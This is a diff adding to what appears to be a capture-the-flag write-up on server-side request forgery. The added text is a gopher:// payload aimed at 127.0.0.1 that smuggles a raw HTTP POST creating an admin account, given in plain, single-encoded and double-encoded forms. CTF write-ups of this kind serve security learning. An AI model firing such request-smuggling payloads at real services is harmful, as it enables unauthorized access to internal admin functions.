@@ -165,3 +165,24 @@ feed=http%3A%2F%2Fflag%2f&security_token=S37qk6Z1CJnNQtKAxETM
 ```
 
 Use apache server. That way you will get the client utility accessing the url.
+
+
+Req:
+
+```
+gopher://127.0.0.1:80/_POST /api/admin/create HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+username=white.rabbit&password=dontbelate
+```
+Single encoding:
+```
+gopher://127.0.0.1:80/_POST%20/api/admin/create%20HTTP/1.1%0d%0aHost:%20127.0.0.1:80%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2041%0d%0a%0d%0ausername=white.rabbit&password=dontbelate
+
+```
+Double encoding:
+```
+gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fapi%2Fadmin%2Fcreate%2520HTTP%2F1.1%250d%250aHost%3A%2520127.0.0.1%3A80%250d%250aContent-Type%3A%2520application%2Fx-www-form-urlencoded%250d%250aContent-Length%3A%252041%250d%250a%250d%250ausername%3Dwhite.rabbit%26password%3Ddontbelate
+```
